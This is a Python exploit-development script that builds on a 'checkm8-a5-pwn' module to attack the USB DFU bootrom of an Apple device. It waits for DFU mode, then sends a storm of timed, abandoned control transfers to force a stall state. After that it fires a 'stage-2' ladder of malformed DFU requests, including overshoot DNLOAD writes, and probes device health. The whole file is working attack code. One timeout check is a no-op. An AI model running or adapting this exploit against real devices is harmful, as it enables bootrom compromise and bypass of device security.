#!/usr/bin/env python3
"""Stormflip: the last stage-1/2 route - flip the ROM into the STALL
era with a cancel-storm, then fire the stage-2 suite inside the same
era, zero idle.

Pure libusb/usbfs - no kernel module involved.
Flow: wait dance entry -> arm -> 12ms-paced abandon shots in the hot
zone, checking every shot's status -> the FIRST STALL flips the state:
stop the storm IMMEDIATELY and fire the stage-2 ladder on the same
handle (DFU protocol, bogus continuation, DNLOAD overshoot write) ->
probe health after.
"""
import ctypes
import fcntl
import glob
import importlib.util
import os
import time

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
d = importlib.util.module_from_spec(spec)
spec.loader.exec_module(d)


def dfu_present():
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() == "1227":
                return True
        except OSError:
            pass
    return False


def wait_dance(timeout=2400):
    if dfu_present():
        print("stale attached - power-hold + dance NOW", flush=True)
        while dfu_present():
            if time.time() > time.time() - timeout + 0:
                pass
            time.sleep(0.05)
        print("gone - dance now", flush=True)
    t0 = time.time()
    while time.time() - t0 < timeout:
        if dfu_present():
            return True
        time.sleep(0.05)
    return False


def serve_probe(timeout=400):
    class Ctl(ctypes.Structure):
        _fields_ = [('r', ctypes.c_ubyte), ('b', ctypes.c_ubyte),
                    ('w', ctypes.c_ushort), ('i', ctypes.c_ushort),
                    ('l', ctypes.c_ushort), ('t', ctypes.c_uint),
                    ('d', ctypes.c_void_p)]
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() != "1227":
                continue
        except OSError:
            continue
        n = os.path.dirname(p)
        bus = int(open(n + "/busnum").read())
        dev = int(open(n + "/devnum").read())
        fd = os.open("/dev/bus/usb/%03d/%03d" % (bus, dev), os.O_RDWR)
        buf = ctypes.create_string_buffer(255)
        ct = Ctl(0x80, 6, 0x0303, 0x0409, 255, timeout,
                 ctypes.cast(buf, ctypes.c_void_p))
        t0 = time.time()
        try:
            r = fcntl.ioctl(fd, 0xC0185500, ct)
            return "ret=%d %.1fms cpid=%s" % (
                r, (time.time() - t0) * 1000,
                "CPID" in buf.raw[:r].decode("utf-16le", "ignore"))
        except OSError as e:
            return "errno=%d %.1fms" % (e.errno, (time.time() - t0) * 1000)
        finally:
            os.close(fd)
    return "GONE"


STAGE2 = [
    ('dfu-getstatus', 0xA1, 3, 0, 0, 6, b''),
    ('dfu-getstate',  0xA1, 5, 0, 0, 1, b''),
    ('dfu-dnload0',   0x21, 1, 0, 0, 0, b''),
    ('dfu-abort',     0x21, 6, 0, 0, 0, b''),
    ('bogus-0x00-w40-d64', 0x00, 0, 0, 0, 0x40, b'D' * 64),
    ('dnload-w40-d40', 0x21, 1, 0, 0, 0x40, b'K' * 0x40),
    ('dnload-w40-d80', 0x21, 1, 0, 0, 0x40, b'L' * 0x80),
    ('dnload-w700-touch', 0x21, 1, 0, 0, 0x10, b'Z' * 0x10),
    ('desc-dev18',     0x80, 6, 0x0100, 0, 0x12, b''),
]


def main():
    if not wait_dance():
        print("no entry")
        return 1
    print("DFU in", flush=True)
    time.sleep(1.0)
    usb = d.LibUSB()
    dev, handle, desc, _ = d.acquire(usb, want_serial=False)
    print("armed; live=%s" % serve_probe(), flush=True)

    zone = [430, 445, 460, 475, 490, 505, 520, 535, 550, 565, 580,
            595, 610, 625, 640, 655, 500, 500, 500]
    flipped = False
    cuts = 0
    for shot in range(1200):
        t = zone[shot % len(zone)]
        try:
            rc, info = usb.raw_ctrl(handle, 0x80, 6, (3 << 8) | 3, 0x040A,
                                    0x80, b'', abandon=True, cancel_at=0x40,
                                    abandon_timeout_ms=t / 1000.0,
                                    timeout_ms=500, name='s%d' % shot)
        except SystemExit:
            if shot % 60 == 0:
                print("shot%d HANG-class" % shot, flush=True)
            try:
                usb.release(handle)
            except Exception:
                pass
            time.sleep(0.8)
            try:
                dev, handle, desc, _ = d.acquire(usb, want_serial=False)
            except Exception:
                print("reacquire failed - stop", flush=True)
                return 1
            continue
        status, actual, cancel_rc, elapsed = info
        if 0 < actual < 128:
            cuts += 1
            print("shot%d: CUT actual=%d (cuts=%d)"
                  % (shot, actual, cuts), flush=True)
        if status == 4:
            print("shot%d: STALL - ERA FLIPPED - stage-2 NOW"
                  % shot, flush=True)
            flipped = True
            break
        if shot % 100 == 99:
            print("..%d shots (cuts=%d) last %s a=%d"
                  % (shot + 1, cuts, d.STATUS_NAMES[status], actual),
                  flush=True)
        time.sleep(0.012)

    if flipped:
        for name, r, b, w, i, l, data in STAGE2:
            try:
                rc2, info2 = usb.raw_ctrl(handle, r, b, w, i, l, data,
                                          abandon=False, timeout_ms=600,
                                          name=name)
                s2, a2 = info2[0], info2[1]
                anom = ""
                if s2 == 0 and a2 not in (0, l):
                    anom = "  <<< ANOMALY"
                print("S2 %-20s: %-9s actual=%-3d %dus%s"
                      % (name, d.STATUS_NAMES[s2], a2, int(info2[3]), anom),
                      flush=True)
            except SystemExit:
                print("S2 %-20s: HANG" % name, flush=True)
        for j in range(4):
            time.sleep(0.6)
            print("post%.1fs: %s" % (0.6 * (j + 1), serve_probe()),
                  flush=True)
    else:
        print("no flip in 1200 shots (cuts=%d)" % cuts, flush=True)
    print("DONE", flush=True)
    return 0


if __name__ == "__main__":
    main()
